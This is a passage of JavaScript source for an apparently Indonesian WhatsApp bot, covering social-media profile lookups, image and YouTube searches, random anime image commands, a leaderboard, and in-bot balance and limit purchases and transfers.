const jenis = anu.result.user.is_business
vreden.sendMessage(m.chat, { image: { url: anu.result.user.hd_profile_pic_url_info.url }, caption: `*${pj}乂 INSTA - STALK${pj}*\n\n*Nickname :* ${nick}\n*Fullname :* ${nama}\n*Postingan :* ${post}\n*Followers :* ${foll}\n*Following :* ${foli}\n*Jenis Akun:* ${jenis ? "Bisnis" : 'Pribadi'}\n*Bio :*\n${bio}`}, {quoted: m})
} catch (err) {
console.log(err)
m.reply("Opss... Username Tidak Ditemukan")
}
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'gimage': case 'gi':{
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
//if (m.isGroup) return m.reply('Untuk menghindari spam, fitur ini di setting hanya untuk private chat!')
if (!text) return warning(`Gunakan dengan cara ${prefix+command} *text*\n\n_Contoh_\n\n${prefix+command} Anime`)
await vreden.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
try {
let anu = await GoogleImage(text)
let result = anu[Math.floor(Math.random() * anu.length)]
vreden.sendMessage(m.chat, { image: { url: result }, caption: `*Sumber :* [ V1 ] Google Image 🔎\n*Result :* Succes ✅\n*Link :* ${result}` }, { quoted: m })
} catch {
m.reply(mess.error.slh)
}
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'pinterest2': case 'pin2':{
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
if (!text) return warning(`Gunakan dengan cara ${prefix+command} *text*\n\n_Contoh_\n\n${prefix+command} Anime`)
if (budy.match(`colmek|coli|bokep|tobrut|seksi|sex|sexi|memek|kontol|titit`)) return tolakk('Terdeteksi Kata Aneh, Tidak Dapat Dilanjutkan')
await vreden.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
let fotopin = await pinterest(text)
let result = await pickRandom(fotopin)
vreden.sendMessage(m.chat, { image: { url: result }, caption: `*Sumber :* [ V1 ] Pinterest 🔎\n*Result :* Succes ✅\n*Link :* ${result}` }, { quoted: m })
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'pinterest': case 'pin':{
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
if (!text) return warning(`Gunakan dengan cara ${prefix+command} *text*\n\n_Contoh_\n\n${prefix+command} Anime`)
if (budy.match(`colmek|coli|bokep|tobrut|seksi|sex|sexi|memek|kontol|titit`)) return tolakk('Terdeteksi Kata Aneh, Tidak Dapat Dilanjutkan')
await vreden.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
let fotopin = await pinterest(text)
const uploadFile = { upload: vreden.waUploadToServer };        
var pinsatu = await prepareWAMessageMedia(
          {
            image: { url: fotopin[0] },
          },
          uploadFile,
        );
var pindua = await prepareWAMessageMedia(
          {
            image: { url: fotopin[1] },
          },
          uploadFile,
        );
var pintiga = await prepareWAMessageMedia(
          {
            image: { url: fotopin[2] },
          },
          uploadFile,
        );
var pinempat = await prepareWAMessageMedia(
          {
            image: { url: fotopin[3] },
          },
          uploadFile,
        );
var pinlima = await prepareWAMessageMedia(
          {
            image: { url: fotopin[4] },
          },
          uploadFile,
        );
let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `*Hasil Pinterest Dari :*\n${text}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: footxt
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: "*Pinterest Search*",
            subtitle: "Yahya Almuthahar",
            hasMediaAttachment: false
          }),
         carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.create({
            cards: [{
            body: proto.Message.InteractiveMessage.Body.create({
            text: `Pinterest Search For:\n${text}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: footxt
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: "1/5 Image",
            subtitle: "Yahya Almuthahar",
            imageMessage: pinsatu.imageMessage,
            hasMediaAttachment: true
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "cta_url",
                "buttonParamsJson": `{\"display_text\":\"📥 Download ( 1 )\",\"url\":\"${fotopin[0]}\",\"merchant_url\":\"${fotopin[0]}\"}`
              }
           ],
          })},{
            body: proto.Message.InteractiveMessage.Body.create({
            text: `Pinterest Search For:\n${text}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: footxt
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: "2/5 Image",
            subtitle: "Yahya Almuthahar",
            imageMessage: pindua.imageMessage,
            hasMediaAttachment: true
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "cta_url",
                "buttonParamsJson": `{\"display_text\":\"📥 Download ( 2 )\",\"url\":\"${fotopin[1]}\",\"merchant_url\":\"${fotopin[1]}\"}`
              }
           ],
          })},{
            body: proto.Message.InteractiveMessage.Body.create({
            text: `Pinterest Search For:\n${text}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: footxt
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: "3/5 Image",
            subtitle: "Yahya Almuthahar",
            imageMessage: pintiga.imageMessage,
            hasMediaAttachment: true
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "cta_url",
                "buttonParamsJson": `{\"display_text\":\"📥 Download ( 3 )\",\"url\":\"${fotopin[2]}\",\"merchant_url\":\"${fotopin[2]}\"}`
              }
           ],
          })},{
            body: proto.Message.InteractiveMessage.Body.create({
            text: `Pinterest Search For:\n${text}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: footxt
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: "4/5 Image",
            subtitle: "Yahya Almuthahar",
            imageMessage: pinempat.imageMessage,
            hasMediaAttachment: true
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "cta_url",
                "buttonParamsJson": `{\"display_text\":\"📥 Download ( 4 )\",\"url\":\"${fotopin[3]}\",\"merchant_url\":\"${fotopin[3]}\"}`
              }
           ],
          })},{
            body: proto.Message.InteractiveMessage.Body.create({
            text: `Pinterest Search For:\n${text}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: footxt
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: "5/5 Image",
            subtitle: "Yahya Almuthahar",
            imageMessage: pinlima.imageMessage,
            hasMediaAttachment: true
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "cta_url",
                "buttonParamsJson": `{\"display_text\":\"📥 Download ( 5 )\",\"url\":\"${fotopin[4]}\",\"merchant_url\":\"${fotopin[4]}\"}`
              }
           ],
          })}],
            })
        })
    }
  }
}, { quoted: m })

await vreden.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})

if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'yts': case 'ytsearch': {
if (!text) return warning(`Example : ${prefix + command} story wa anime`)
let search = await yts(text)
let uii = await search.all
let teks = '*YouTube Search*\n\nResult From '+text+'\nketik *getmusic* untuk mengambil mp3 dan *getvideo* untuk mp4\ngunakan dengan nomor urutan, contoh *getmusic 1*\n\n'
let no = 1
for (let i of uii.filter(objek => objek.type === "video")) {
teks += `⭔ No Urutan : ${no++}\n⭔ Type : ${i.type}\n⭔ Video ID : ${i.videoId}\n⭔ Title : ${i.title}\n⭔ Views : ${i.views}\n⭔ Duration : ${i.timestamp}\n⭔ Upload At : ${i.ago}\n⭔ Url : ${i.url}\n─────────────────\n`
}
vreden.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
db.data.users[m.sender].exp += await randomNomor(20)
break

 // Random Menu
 case 'cecan':{
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
await vreden.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
addCountCmd('cecan', m.sender, _cmd)
var query = ["cewe korea","cewe china", "cewe Thailand"]
let datax = await pinterest(query[Math.floor(Math.random() * query.length)])
let anu = datax[Math.floor(Math.random() * datax.length)]
vreden.sendMessage(m.chat, { caption: "Random Cecan", image: { url: anu }}, { quoted: m })
.catch((e) => {
m.reply(mess.error.api)

})
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'akira':
case 'akiyama':
case 'ana':
case 'asuna':
case 'ayuzawa':
case 'boruto':
case 'chitanda':
case 'chitoge':
case 'cosplay':
case 'deidara':
case 'doraemon':
case 'elaina':
case 'emilia':
case 'erza':
case 'fanart':
case 'gremory':
case 'hestia':
case 'hinata':
case 'husbu':
case 'waifu':
case 'icon':
case 'inori':
case 'isuzu':
case 'itachi':
case 'itori':
case 'kaga':
case 'kagura':
case 'kaguya':
case 'kakasih':
case 'kaneki':
case 'kaori':
case 'keneki':
case 'kosaki':
case 'kotori':
case 'kuriyama':
case 'kuroha':
case 'kurumi':
case 'loli':
case 'madara':
case 'mikasa':
case 'miku':
case 'minato':
case 'naruto':
case 'natsukawa':
case 'nekonime':
case 'nezuko':
case 'nishimiya':
case 'onepiece':
case 'pokemon':
case 'rem':
case 'rize':
case 'sagiri':
case 'sakura':
case 'sasuke':
case 'shina':
case 'shinka':
case 'shizuka':
case 'simp':
case 'tomori':
case 'toukachan':
case 'tsunade':
case 'yatogami':
case 'yuki': {
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
 if (/akira/.test(command)) link = "https://raw.githubusercontent.com/vreden/vreden-sfw/main/anime-akira.json"
 if (/akiyama/.test(command)) link = "https://raw.githubusercontent.com/vreden/vreden-sfw/main/anime-akiyama.json"
 if (/ana/.test(command)) link = "https://raw.githubusercontent.com/vreden/vreden-sfw/main/anime-anna.json"
 if (/asuna/.test(command)) link = "https://raw.githubusercontent.com/vreden/vreden-sfw/main/anime-asuna.json"
 if (/ayuzawa/.test(command)) link = "https://raw.githubusercontent.com/vreden/vreden-sfw/main/anime-ayuzawa.json"
 if (/boruto/.test(command)) link = "https://raw.githubusercontent.com/vreden/vreden-sfw/main/anime-boruto.json"
 if (/chitanda/.test(command)) link = "https://raw.githubusercontent.com/vreden/vreden-sfw/main/chitanda.json"
 if (/chitoge/.test(command)) link = "https://raw.githubusercontent.com/vreden/vreden-sfw/main/anime-chitoge.json"
 if (/cosplay/.test(command)) link = "https://raw.githubusercontent.com/vreden/vreden-sfw/main/anime-cosplay.json"
 if (/deidara/.test(command)) link = "https://raw.githubusercontent.com/vreden/vreden-sfw/main/anime-deidara.json"
if (/doraemon/.test(command)) link = "https://raw.githubusercontent.com/vreden/vreden-sfw/main/doraemon.json"
 if (/elaina/.test(command)) link = "https://raw.githubusercontent.com/vreden/vreden-sfw/main/anime-elaina.json"
 if (/emilia/.test(command)) link = "https://raw.githubusercontent.com/vreden/vreden-sfw/main/anime-emilia.json"
 if (/erza/.test(command)) link = "https://raw.githubusercontent.com/vreden/vreden-sfw/main/anime-erza.json"
 if (/fanart/.test(command)) link = "https://raw.githubusercontent.com/vreden/vreden-sfw/main/fanart.json"
 if (/gremory/.test(command)) link = "https://raw.githubusercontent.com/vreden/vreden-sfw/main/gremory.json"
 if (/hestia/.test(command)) link = "https://raw.githubusercontent.com/vreden/vreden-sfw/main/anime-hestia.json"
 if (/hinata/.test(command)) link = "https://raw.githubusercontent.com/vreden/vreden-sfw/main/anime-hinata.json"
 if (/husbu/.test(command)) link = "https://raw.githubusercontent.com/vreden/vreden-sfw/main/husbu.json"
 if (/waifu/.test(command)) link = "https://raw.githubusercontent.com/vreden/vreden-sfw/main/waifu.json"
 if (/icon/.test(command)) link = "https://raw.githubusercontent.com/vreden/vreden-sfw/main/icon.json"
 if (/inori/.test(command)) link = "https://raw.githubusercontent.com/vreden/vreden-sfw/main/anime-inori.json"
 if (/isuzu/.test(command)) link = "https://raw.githubusercontent.com/vreden/vreden-sfw/main/anime-isuzu.json"
 if (/itachi/.test(command)) link = "https://raw.githubusercontent.com/vreden/vreden-sfw/main/anime-itachi.json"
 if (/itori/.test(command)) link = "https://raw.githubusercontent.com/vreden/vreden-sfw/main/anime-itori.json"
 if (/kaga/.test(command)) link = "https://raw.githubusercontent.com/vreden/vreden-sfw/main/anime-kaga.json"
 if (/kagura/.test(command)) link = "https://raw.githubusercontent.com/vreden/vreden-sfw/main/anime-kagura.json"
 if (/kaguya/.test(command)) link = "https://raw.githubusercontent.com/vreden/vreden-sfw/main/kaguya.json"
 if (/kakasih/.test(command)) link = "https://raw.githubusercontent.com/vreden/vreden-sfw/main/kakasih.json"
 if (/kaneki/.test(command)) link = "https://raw.githubusercontent.com/vreden/vreden-sfw/main/kaneki.json"
 if (/kaori/.test(command)) link = "https://raw.githubusercontent.com/vreden/vreden-sfw/main/anime-kaori.json"
 if (/keneki/.test(command)) link = "https://raw.githubusercontent.com/vreden/vreden-sfw/main/anime-keneki.json"
if (/kosaki/.test(command)) link = "https://raw.githubusercontent.com/vreden/vreden-sfw/main/kosaki.json"
 if (/kotori/.test(command)) link = "https://raw.githubusercontent.com/vreden/vreden-sfw/main/anime-kotori.json"
 if (/kuriyama/.test(command)) link = "https://raw.githubusercontent.com/vreden/vreden-sfw/main/kuriyama.json"
 if (/kuroha/.test(command)) link = "https://raw.githubusercontent.com/vreden/vreden-sfw/main/kuroha.json"
 if (/kurumi/.test(command)) link = "https://raw.githubusercontent.com/vreden/vreden-sfw/main/anime-kurumi.json"
 if (/loli/.test(command)) link = "https://raw.githubusercontent.com/vreden/vreden-sfw/main/loli.json"
 if (/madara/.test(command)) link = "https://raw.githubusercontent.com/vreden/vreden-sfw/main/anime-madara.json"
 if (/mikasa/.test(command)) link = "https://raw.githubusercontent.com/vreden/vreden-sfw/main/anime-mikasa.json"
 if (/miku/.test(command)) link = "https://raw.githubusercontent.com/vreden/vreden-sfw/main/anime-miku.json"
 if (/minato/.test(command)) link = "https://raw.githubusercontent.com/vreden/vreden-sfw/main/anime-minato.json"
 if (/naruto/.test(command)) link = "https://raw.githubusercontent.com/vreden/vreden-sfw/main/anime-naruto.json"
 if (/natsukawa/.test(command)) link = "https://raw.githubusercontent.com/vreden/vreden-sfw/main/natsukawa.json"
 if (/nekonime/.test(command)) link = "https://raw.githubusercontent.com/vreden/vreden-sfw/main/nekonime.json"
 if (/nezuko/.test(command)) link = "https://raw.githubusercontent.com/vreden/vreden-sfw/main/anime-nezuko.json"
 if (/nishimiya/.test(command)) link = "https://raw.githubusercontent.com/vreden/vreden-sfw/main/nishimiya.json"
 if (/onepiece/.test(command)) link = "https://raw.githubusercontent.com/vreden/vreden-sfw/main/onepiece.json"
 if (/pokemon/.test(command)) link = "https://raw.githubusercontent.com/vreden/vreden-sfw/main/pokemon.json"
 if (/rem/.test(command)) link = "https://raw.githubusercontent.com/vreden/vreden-sfw/main/rem.json"
 if (/rize/.test(command)) link = "https://raw.githubusercontent.com/vreden/vreden-sfw/main/rize.json"
 if (/sagiri/.test(command)) link = "https://raw.githubusercontent.com/vreden/vreden-sfw/main/anime-sagiri.json"
 if (/sakura/.test(command)) link = "https://raw.githubusercontent.com/vreden/vreden-sfw/main/anime-sakura.json"
 if (/sasuke/.test(command)) link = "https://raw.githubusercontent.com/vreden/vreden-sfw/main/anime-sasuke.json"
 if (/shina/.test(command)) link = "https://raw.githubusercontent.com/vreden/vreden-sfw/main/shina.json"
 if (/shinka/.test(command)) link = "https://raw.githubusercontent.com/vreden/vreden-sfw/main/shinka.json"
 if (/shizuka/.test(command)) link = "https://raw.githubusercontent.com/vreden/vreden-sfw/main/shizuka.json"
 if (/simp/.test(command)) link = "https://raw.githubusercontent.com/vreden/vreden-sfw/main/simp.json"
 if (/tomori/.test(command)) link = "https://raw.githubusercontent.com/vreden/vreden-sfw/main/tomori.json"
 if (/toukachan/.test(command)) link = "https://raw.githubusercontent.com/vreden/vreden-sfw/main/toukachan.json"
 if (/tsunade/.test(command)) link = "https://raw.githubusercontent.com/vreden/vreden-sfw/main/tsunade.json"
 if (/yatogami/.test(command)) link = "https://raw.githubusercontent.com/vreden/vreden-sfw/main/yatogami.json"
 if (/yuki/.test(command)) link = "https://raw.githubusercontent.com/vreden/vreden-sfw/main/yuki.json"
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
let animek = await fetchJson(link)
let dl_url = await pickRandom(animek)
vreden.sendMessage(m.chat, { caption: `Random ${command}`, image: { url: dl_url }}, { quoted: m })
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'cogan':{
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
await vreden.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
addCountCmd('cogan', m.sender, _cmd)
var query = ["cowo korea","cowo china", "cowo Thailand"]
let datax = await pinterest(query[Math.floor(Math.random() * query.length)])
let anu = datax[Math.floor(Math.random() * datax.length)]
vreden.sendMessage(m.chat, { caption: "Random Cogan", image: { url: anu }}, { quoted: m })
.catch((e) => {
m.reply(mess.error.api)

})
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
}
db.data.users[m.sender].exp += await randomNomor(20)
break
// Balance Menu
case 'topglobal': {
if (!m.isGroup) return warning(mess.OnlyGrup)
function ppnyoo(num) {
if (num === 1) {
return "https://telegra.ph/file/f418149c4f8d91d47fd9b.png"
} else if (num === 2) {
return "https://telegra.ph/file/66589a9c08e7b092f0d1b.png"
} else if (num === 3) {
return "https://telegra.ph/file/6b170e698917c5092f0e0.png"
} else {
return "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60"
}
}
let users = Object.entries(global.db.data.users).map(([key, value]) => {
    return {...value, jid: key}
  })
function sort(property, ascending = true) {
  if (property) return (...args) => args[ascending & 1][property] - args[!ascending & 1][property]
  else return (...args) => args[ascending & 1] - args[!ascending & 1]
}
function enumGetKey(a) {
  return a.jid
}
function toNumber(property, _default = 0) {
  if (property) return (a, i, b) => {
    return {...b[i], [property]: a[property] === undefined ? _default : a[property]}
  }
  else return a => a === undefined ? _default : a
}
let sortedRank = users.map(toNumber('rank')).sort(sort('rank'))
let usersRank = sortedRank.map(enumGetKey)
let len = args[0] && args[0].length > 0 ? Math.min(10, Math.max(parseInt(args[0]), 10)) : Math.min(10, sortedRank.length)
let nel = args[0] && args[0].length > 0 ? Math.min(3, Math.max(parseInt(args[0]), 3)) : Math.min(3, sortedRank.length)
let data = []
sortedRank.slice(0, nel).map(({ jid, rank }, i) => {
const phon = PhoneNumber('+' + jid.replace('@s.whatsapp.net', '')).getNumber('international')
const pp = ppnyoo(i + 1)
const res = {
top: `${i + 1}`,
avatar: `${pp}`,
tag: `${phon}`,
score: `${db.data.users[jid].rank}`
}
data.push(res)
}
)
let txt = `
• *GLOBAL RANK TOP ${len}👑* •
Kamu: *${usersRank.indexOf(m.sender) + 1}* dari *${usersRank.length}*

${sortedRank.slice(0, len).map(({ jid, rank }, i) => `${i + 1}. ${participants.some(p => jid === p.jid) ? `(${vreden.getName(jid)}) wa.me/` : '@'}${jid.split`@`[0]}\n- *Rank:* ${pangkat(jid).rank}\n- *Rank Points:* ${db.data.users[jid].rank}\n- *Level:* ${db.data.users[jid].level}`).join`\n\n`}

`
const top = await new canvafy.Top()
.setOpacity(0.6)
.setScoreMessage("Rank Point:") //(Preferred Option)
.setabbreviateNumber(false) //(Preferred Option)
.setBackground("image", "https://telegra.ph/file/d0fce5c840f366526bab7.jpg") //(Preferred Option)
.setColors({ box: '#212121', username: '#ffffff', score: '#ffffff', firstRank: '#f7c716', secondRank: '#9e9e9e', thirdRank: '#94610f' }) //(Preferred Option)
.setUsersData(data)
.build();
let button = [
              {
                "name": "single_select",
                "buttonParamsJson": "{\n  title: 'Claim Points',\n  sections: [\n    {\n      title: 'Weekly And Monthly',\n      rows: [\n  {\n    header: 'Claim Weekly Reward 🟣',\n    title: 'mingguan',\n    id: '.mingguan'\n  },\n  {\n    header: 'Claim Monthly Reward 🟡',\n    title: 'bulanan',\n    id: '.bulanan'\n  }\n]\n    },{\n      title: 'Game Get Reward',\n      rows: [\n  {\n    header: 'Asah Otak 🧠',\n    title: 'asahotak',\n    id: '.asahotak'\n  },{\n    header: 'Tebak Cak Lontong 🎴',\n    title: 'caklontong',\n    id: '.caklontong'\n  },{\n    header: 'Family 100 Game 💯',\n    title: 'family100',\n    id: '.family100'\n  },{\n    header: 'Lengkapi Kalimat 🕵️‍♂️',\n    title: 'lengkapikalimat',\n    id: '.lengkapikalimat'\n  },{\n    header: 'Slot Game 🎰',\n    title: 'slot',\n    id: '.slot'\n  },{\n    header: 'Susun Kata 🗯️',\n    title: 'susunkata',\n    id: '.susunkata'\n  },{\n    header: 'Tebak Aplikasi 📱',\n    title: 'tebakaplikasi',\n    id: '.tebakaplikasi'\n  },{\n    header: 'Tebak Bendera 🇮🇩',\n    title: 'tebakbendera',\n    id: '.tebakbendera'\n  },{\n    header: 'Tebak Bom 💣',\n    title: 'tebakbom',\n    id: '.tebakbom'\n  },{\n    header: 'Tebak Free Fire 🔫',\n    title: 'tebakff',\n    id: '.tebakff'\n  },{\n    header: 'Tebak Gambar 🖼️',\n    title: 'tebakgambar',\n    id: '.tebakgambar'\n  },{\n    header: 'Tebak Game 🎮',\n    title: 'tebakgame',\n    id: '.tebakgame'\n  },{\n    header: 'Tebak Mobile Legends 🕹️',\n    title: 'tebakhero',\n    id: '.tebakhero'\n  },{\n    header: 'Tebak Kalimat ✉️',\n    title: 'tebakkalimat',\n    id: '.tebakkalimat'\n  },{\n    header: 'Tebak Kata 📠',\n    title: 'tebakkata',\n    id: '.tebakkata'\n  },{\n    header: 'Tebak Kimia ☣️',\n    title: 'tebakkimia',\n    id: '.tebakkimia'\n  },{\n    header: 'Tebak Lirik 🎶',\n    title: 'tebaklirik',\n    id: '.tebaklirik'\n  },{\n    header: 'Tebak Siapa 👤',\n    title: 'tebaksiapa',\n    id: '.tebaksiapa'\n  },{\n    header: 'Tebak Tebakan ❓',\n    title: 'tebaktebakan',\n    id: '.tebaktebakan'\n  }\n]\n    }\n  ]\n}"
              }
             ]
sendButtonImage(m.chat, "", txt, top, button)
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'buylimit':{
if (!text) return warning(`Gunakan dengan cara ${prefix+command} *jumlah limit yang ingin dibeli*\n\nHarga 1 limit = Rp 250 saldo\n\n*Contoh:*\n.buylimit 10`)
if (text.includes('-')) return warning(`Jangan menggunakan -`)
if (isNaN(text)) return warning(`Harus berupa angka`)
if (args[0] === 'infinity') return warning(`Yahaha saya ndak bisa di tipu`)
let ane = Number(parseInt(text) * 250)
if (db.data.users[m.sender].saldo < ane) return warning(`Saldo kamu tidak mencukupi untuk pembelian ini`)
addCountCmd('buylimit', m.sender, _cmd)
db.data.users[m.sender].saldo -= parseInt(ane)
db.data.users[m.sender].limit += parseInt(text)
m.reply(`Pembeliaan limit sebanyak ${text} berhasil\n\nSisa Saldo : Rp ${db.data.users[m.sender].saldo}\nSisa Limit : ${db.data.users[m.sender].limit}`)
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'buygamelimit': case 'buyglimit':{
if (!text) return warning(`Gunakan dengan cara ${prefix+command} *jumlah game limit yang ingin dibeli*\n\nHarga 1 game limit = Rp 250 saldo\n*Contoh:*\n.buyglimit 10`)
if (text.includes('-')) return warning(`Jangan menggunakan -`)
if (isNaN(text)) return warning(`Harus berupa angka`)
if (text === 'infinity') return warning(`Yahaha saya ndak bisa di tipu`)
let ane = Number(parseInt(text) * 250)
if (db.data.users[m.sender].saldo < ane) return warning(`Saldo kamu tidak mencukupi untuk pembelian ini`)
addCountCmd('buygamelimit', m.sender, _cmd)
db.data.users[m.sender].saldo -= parseInt(ane)
db.data.users[m.sender].glimit += parseInt(text)
m.reply(`Pembeliaan game limit sebanyak ${text} berhasil\n\nSisa Saldo : Rp ${db.data.users[m.sender].saldo}\nSisa Game Limit : ${db.data.users[m.sender].glimit}`)
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'ttstalk': case 'tiktokstalk': {
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
if (!q) return warning(`Contoh: ${prefix+command} nickname`)
await vreden.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
try {
let result = await fetchJson(`https://api.vreden.my.id/api/tiktokStalk?query=${text}`)
let post = await convertAngka(result.result.stats.videoCount)
let follwer = await convertAngka(result.result.stats.followerCount)
let follwing = await convertAngka(result.result.stats.followingCount)
let likes = await convertAngka(result.result.stats.heartCount)
let fien = await convertAngka(result.result.stats.friendCount)
vreden.sendMessage(m.chat, { image: { url: result.result.user.avatarLarger }, caption: `*${pj}乂 TIKTOK - STALK${pj}*\n\n*Nickname :* ${result.result.user.nickname}\n*Username :* ${result.result.user.uniqueId}\n*Postingan :* ${post}\n*Pengikut :* ${follwer}\n*Mengikuti :* ${follwing}\n*Suka :* ${likes}\n*Teman :* ${fien}\n*Bio :* \n${result.result.user.signature}`}, {quoted: m})
} catch (err) {
console.log(err)
m.reply("Opss... Username Tidak Ditemukan")
}
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'transfer': case 'tf':{
if (!text) return warning(`Gunakan dengan cara ${prefix+command} *@tag nominal*\n\nContoh : ${prefix+command} @6285600793871 2000`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (!m.mentionedJid[0] && !m.quoted && !text) return warning(`Tag/Reply Target Yang Mau Di ${command}`)
if (!args[1]) return warning(`Masukkan nominal nya!\n\nContoh : ${prefix+command} @6285600793871 2000`)
if (isNaN(args[1])) return warning(`Nominal harus berupa angka!\n\nContoh : ${prefix+command} @6285600793871 2000`)
if (args[1] === 'infinity') return warning(`Yahaha saya ndak bisa di tipu`)
if (args[1].includes("-")) return warning(`Jangan menggunakan -\n\nContoh : ${prefix+command} @6285600793871 2000`)
var anu = db.data.users[m.sender].saldo
if (anu < args[1] || anu == 'undefined') return warning(`Saldo Kamu Tidak Mencukupi Untuk Transfer Sebesar Rp ${args[1]}, Kumpulkan Terlebih Dahulu\nKetik ${prefix}saldo, untuk mengecek Saldo mu!`)
addCountCmd('transfer', m.sender, _cmd)
db.data.users[m.sender].saldo -= parseInt(args[1])
db.data.users[users].saldo += parseInt(args[1])
vreden.sendTextWithMentions(m.chat, `Sukses transfer saldo sebesar ${args[1]} kepada @${users.split("@")[0]}`, m)
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'transferlimit': case 'tflimit':{
if (!text) return warning(`Gunakan dengan cara ${prefix+command} *@tag nominal*\n\nContoh : ${prefix+command} @6285600793871 2000`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (!m.mentionedJid[0] && !m.quoted && !text) return warning(`Tag/Reply Target Yang Mau Di ${command}`)
if (!args[1]) return warning(`Masukkan nominal nya!\n\nContoh : ${prefix+command} @6285600793871 2000`)
if (isNaN(args[1])) return warning(`Nominal harus berupa angka!\n\nContoh : ${prefix+command} @6285600793871 2000`)
if (args[1] === 'infinity') return warning(`Yahaha saya ndak bisa di tipu`)
if (args[1].includes("-")) return warning(`Jangan menggunakan -\n\nContoh : ${prefix+command} @6285600793871 2000`)
var anu = db.data.users[m.sender].limit
if (anu < args[1] || anu == 'undefined') return warning(`Limit Kamu Tidak Mencukupi Untuk Transfer Sebesar Rp ${args[1]}, Kumpulkan Terlebih Dahulu\nKetik ${prefix}limit, untuk mengecek Limit mu!`)
addCountCmd('transfer', m.sender, _cmd)
db.data.users[m.sender].limit -= parseInt(args[1])
db.data.users[users].limit += parseInt(args[1])
vreden.sendTextWithMentions(m.chat, `Sukses transfer limit sebesar ${args[1]} kepada @${users.split("@")[0]}`, m)
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'tfgamelimit': case 'transfergamelimit': case 'tfglimit':{
if (!text) return warning(`Gunakan dengan cara ${prefix+command} *@tag nominal*\n\nContoh : ${prefix+command} @6285600793871 2000`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (!m.mentionedJid[0] && !m.quoted && !text) return warning(`Tag/Reply Target Yang Mau Di ${command}`)
if (!args[1]) return warning(`Masukkan nominal nya!\n\nContoh : ${prefix+command} @6285600793871 2000`)
if (isNaN(args[1])) return warning(`Nominal harus berupa angka!\n\nContoh : ${prefix+command} @6285600793871 2000`)
if (args[1] === 'infinity') return warning(`Yahaha saya ndak bisa di tipu`)
